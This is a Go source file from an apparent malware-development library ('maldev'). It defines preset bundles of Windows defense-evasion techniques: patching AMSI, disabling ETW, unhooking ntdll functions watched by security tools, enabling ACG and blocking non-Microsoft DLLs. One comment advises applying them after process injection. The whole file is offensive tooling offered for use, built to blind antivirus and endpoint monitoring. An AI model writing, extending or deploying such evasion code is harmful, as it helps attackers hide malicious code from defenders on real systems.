//go:build windows

package preset

import (
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/acg"
	"github.com/oioio-space/maldev/evasion/amsi"
	"github.com/oioio-space/maldev/evasion/blockdlls"
	"github.com/oioio-space/maldev/evasion/etw"
	"github.com/oioio-space/maldev/evasion/unhook"
)

// Minimal returns AMSI + ETW patches. Least detectable, most compatible.
func Minimal() []evasion.Technique {
	return []evasion.Technique{
		amsi.ScanBufferPatch(),
		etw.All(),
	}
}

// Stealth returns Minimal + selective unhook of commonly hooked NT functions.
func Stealth() []evasion.Technique {
	return append(Minimal(), unhook.CommonClassic()...)
}

// Aggressive returns everything: AMSI, ETW, full ntdll unhook, ACG, block DLLs.
// WARNING: ACG prevents subsequent RWX allocation. Apply AFTER injection.
func Aggressive() []evasion.Technique {
	return []evasion.Technique{
		amsi.All(),
		etw.All(),
		unhook.Full(),
		acg.Guard(),
		blockdlls.MicrosoftOnly(),
	}
}
